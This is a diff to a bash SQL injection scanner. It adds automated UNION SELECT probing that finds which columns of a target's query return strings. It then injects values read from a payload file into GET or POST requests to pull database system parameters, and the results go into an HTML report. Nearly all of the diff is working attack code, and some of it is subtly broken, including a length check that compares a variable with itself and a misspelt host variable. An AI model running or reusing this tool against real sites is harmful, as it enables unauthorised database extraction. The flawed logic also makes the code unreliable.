@@ -231,17 +231,125 @@ if [[ $statusselY != $statusselN || $lengthselN != $lengthselN ]] ; then
 fi
 
 #if the union select worked, lets enumerate the data types
-#if [[ "$selectsuccess" == 1 ]] ; then
-#	unionselectout
-#fi
+if [[ "$selectsuccess" == 1 ]] ; then
+	selinject="'qwEqrEe'"
+	unionselectout
+fi
 
 }
 
-#unionselectout()
-#{
-#	echo "UNION SELECT OUTPUT!"
-#}
+unionselectout()
+{
+echo "Using UNION SELECT to test for string columns"
+((selparamcount=1))
+while [[ $selparamcount -le $colno ]] ; do
+	#we need to create a string like union select null,'asdwerwe',null,null with a 'null,' for the colno (number of columns from the order by x) 
+	((nullcount=0))
+	nullstring=""
+	while [[ $nullcount -lt $colno ]] ; do
+		((nullcount=$nullcount+1))
+		if (($nullcount==$colno)) ; then
+			if (($nullcount==$selparamcount)) ; then
+				nullstring=$nullstring$selinject
+			else
+				nullstring=$nullstring"null"
+			fi
+		else 
+			if (($nullcount==$selparamcount)) ; then
+				nullstring=$nullstring$selinject","
+			else
+				nullstring=$nullstring"null,"
+			fi
+		fi
+	done
+	
+	#we create a nullstring similar to the above but with one extra null to use as a request that should fail
+	((nullcount=0))
+	nullwrongstring=""
+	while [[ $nullcount -lt $colno ]] ; do
+		((nullcount=$nullcount+1))
+		if (($nullcount==$colno)) ; then
+			if (($nullcount==$selparamcount)) ; then
+				nullwrongstring=$nullwrongstring$selinject
+			else
+				nullwrongstring=$nullwrongstring"null"
+			fi
+		else 
+			if (($nullcount==$selparamcount)) ; then
+				nullwrongstring=$nullwrongstring$selinject","
+			else
+				nullwrongstring=$nullwrongstring"null,"
+			fi
+		fi
+	done
+	nullwrongstring=$nullwrongstring",null"
+	
+	badparams=`echo "$outputstore" | replace "$encodedpayload" "1$quote+union+select+$nullwrongstring$end"`
+	#echo "DEBUG wrong $badparams"
+	requester
+	statusselN=`echo $response | cut -d ":" -f 1`
+	lengthselN=`echo $response | cut -d ":" -f 2`
+	
+	badparams=`echo "$outputstore" | replace "$encodedpayload" "1$quote+union+select+$nullstring$end"`
+	#echo "DEBUG right $badparams"
+	requester
+	statusselY=`echo $response | cut -d ":" -f 1`
+	lengthselY=`echo $response | cut -d ":" -f 2`
+	
+	if [[ $statusselY != $statusselN || $lengthselN != $lengthselN ]] ; then
+		echo -e '\E[31;48m'"\033[1m[UNION SELECT STRING COLUMN $selparamcount REQ:$K]\033[0m $request"
+		tput sgr0 # Reset attributes.
+		echo "[UNION SELECT STRING COLUMN $selparamcount REQ:$K] $request" >> ./output/$safefilename$safelogname.txt;
+		selectsystemstrings
+	fi
+	((selparamcount=$selparamcount+1))
+done	
+}
 
+selectsystemstrings()
+{
+echo "Attempting to extract system parameters (reading params from ./payloads/system-params.txt)"
+cat ./payloads/system-params.txt | while read inj3ct ; do
+	badparams=`echo "$outputstore" | replace "$encodedpayload" "1$quote+union+select+$nullstring$end"`
+#	badparams=`echo "$outputstore"`
+	requester
+	cp ./dump ./selcheck1
+	badparams=`echo "$badparams" | replace "$selinject" "$inj3ct"`
+	requester
+	status=`echo $response | cut -d ":" -f 1`
+	systemstring=`diff ./dump ./selcheck1`
+	#for a union select to be working, you should be getting a 200 status back:
+	if [[ "$systemstring" != "" && $status == "200" ]] ; then
+		diff ./dump ./selcheck1 > ./responsediffs/$safefilename-selectrespdiff-R-$K-P-$payloadcounter.txt
+		######
+		if [[ $method != "POST" ]]; then #we're doing a get - simples 
+			echo "[SEL-LENGTH-DIFF $inj3ct REQ:$K $safefilename-selectrespdiff-R-$K-P-$payloadcounter.txt] $method URL: $uhostname$page"?"$badparams" >> ./output/$safefilename$safelogname.txt
+			echo -e '\E[31;48m'"\033[1m[SEL-LENGTH-DIFF $inj3ct REQ:$K]\033[0m $method URL: $uhostname$page"?"$badparams" ;
+			tput sgr0 # Reset attributes.
+		else
+			if (($firstPOSTURIURL>0)) ; then
+				if [ $firstPOSTURIURL == 1 ] ; then
+					echo "[SEL-LENGTH-DIFF $inj3ct REQ:$K $safefilename-selectrespdiff-R-$K-P-$payloadcounter.txt ] $method URL: $uhostnam$page"?"$static"??"$badparams" >> ./output/$safefilename$safelogname.txt
+					echo -e '\E[31;48m'"\033[1m[SEL-LENGTH-DIFF $inj3ct REQ:$K]\033[0m $method URL: $uhostname$page"?"$static"??"$badparams";
+					tput sgr0 # Reset attributes.
+				else
+					echo "[SEL-LENGTH-DIFF $inj3ct REQ:$K $safefilename-selectrespdiff-R-$K-P-$payloadcounter.txt] $method URL: $uhostname	$page"??"$badparams" >> ./output/$safefilename$safelogname.txt
+					echo -e '\E[31;48m'"\033[1m[SEL-LENGTH-DIFF $inj3ct REQ:$K]\033[0m $method URL: $uhostname$page"??"$badparams";
+					tput sgr0 # Reset attributes.
+				fi
+			else
+				#normal post
+				echo "[SEL-LENGTH-DIFF $inj3ct REQ:$K $safefilename-selectrespdiff-R-$K-P-$payloadcounter.txt] $method URL: $uhostname$page"?"$badparams" >> ./output/$safefilename$safelogname.txt
+				echo -e '\E[31;48m'"\033[1m[SEL-LENGTH-DIFF $inj3ct REQ:$K]\033[0m $method URL: $uhostname$page"?"$badparams"
+				tput sgr0 # Reset attributes.
+			fi
+		fi
+	######
+	fi
+done
+}
+
+##### END OF FUNCTION DEFINITIONS SECTION ######	
 #remove any residual files left lying about: 
 rm cleanscannerinputlist.txt 2>/dev/null
 rm 0 2>/dev/null
@@ -1579,10 +1687,17 @@ cat ./output/$safefilename$safelogname.sorted.txt | while read aLINE ; do
 		fi
 	fi
 	if [[ "$message" =~ "LENGTH-DIFF" ]] ; then
-		echo "<br>" >> ./output/$safefilename$safelogname.html
-		respdiff=`echo $message | cut -d " " -f 4`
-		echo " <a href="./../responsediffs/$respdiff">View Response Diff</a>" >> ./output/$safefilename$safelogname.html
-		echo "<br>" >> ./output/$safefilename$safelogname.html	
+		if [[ "$message" =~ "SEL-LENGTH-DIFF" ]] ; then
+			echo "<br>" >> ./output/$safefilename$safelogname.html
+			selectrespdiff=`echo $message | cut -d " " -f 4`
+			echo " <a href="./../responsediffs/$selectrespdiff">View Response Diff</a>" >> ./output/$safefilename$safelogname.html
+			echo "<br>" >> ./output/$safefilename$safelogname.html	
+		else
+			echo "<br>" >> ./output/$safefilename$safelogname.html
+			respdiff=`echo $message | cut -d " " -f 4`
+			echo " <a href="./../responsediffs/$respdiff">View Response Diff</a>" >> ./output/$safefilename$safelogname.html
+			echo "<br>" >> ./output/$safefilename$safelogname.html	
+		fi
 	fi
 	echo "------------------------------------------------------------------" >> ./output/$safefilename$safelogname.html
 	echo "<br>" >> ./output/$safefilename$safelogname.html
